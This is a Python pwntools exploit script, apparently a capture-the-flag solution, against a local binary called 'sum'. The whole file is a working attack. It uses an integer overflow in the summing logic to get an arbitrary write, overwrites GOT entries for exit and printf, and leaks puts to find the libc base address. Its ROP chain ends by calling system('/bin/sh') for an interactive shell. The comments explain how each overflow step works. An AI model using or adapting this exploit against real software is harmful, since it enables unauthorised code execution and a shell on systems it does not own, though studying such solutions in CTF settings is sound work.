#!/usr/bin/python 
from pwn import *

#s = process("./sum", env={"LD_PRELOAD": "./libc.so"})
s = process("./sum")
elf = ELF("./sum")
libc = ELF("./libc-2.27.so")
#s.recvuntil("2 3 4 0")

def write(address, value):
    s.sendlineafter("2 3 4 0", str(0x7fffffffffffffff))             #1            
    s.sendline(str(0x7fffffffffffffff-address))     #2. #2 and #6 will add up to 0x7fffffffffffffff. Then 0x7fffffffffffffff adds with itself (#1) gives sum = 0xfffffffffffffffe 
    s.sendline("1")                                 #3  this will make sum = 0xffffffffffffffff
    s.sendline("1")                                 #4  this will cause integer overflow => sum = 0
    s.sendline(str(value))                          #5  sum = 0 + value = value 
    s.sendline(str(address))                        #6  overwrite address with value 

main = elf.symbols["main"]
exit_got = elf.got["exit"]
printf = elf.got["printf"]
puts_got = elf.got["puts"]
puts_plt = elf.symbols["puts"]
log.info("main: {}".format(hex(main)))
log.info("exit@got: {}".format(hex(exit_got)))

write(exit_got, main)

pop_rdi_ret = 0x0000000000400a43
pop_rsi_r15_ret = 0x0000000000400a41

write(printf, pop_rdi_ret)

s.sendlineafter("2 3 4 0", str(pop_rdi_ret))
s.sendline(str(puts_got))
s.sendline(str(puts_plt))
s.sendline(str(0x4009a7))                           # address of "call exit@plt" to return to main 
s.sendline("0")

s.recvline()
leak = u64(s.recvline().strip("\n").ljust(8, "\x00"))
libc.address = leak - libc.symbols["puts"]
log.success("Libc base address: {}".format(hex(libc.address)))

s.sendlineafter("2 3 4 0", str(pop_rdi_ret))
s.sendline(str(next(libc.search("/bin/sh"))))
s.sendline(str(libc.symbols["system"]))
s.sendline("0")

s.interactive()

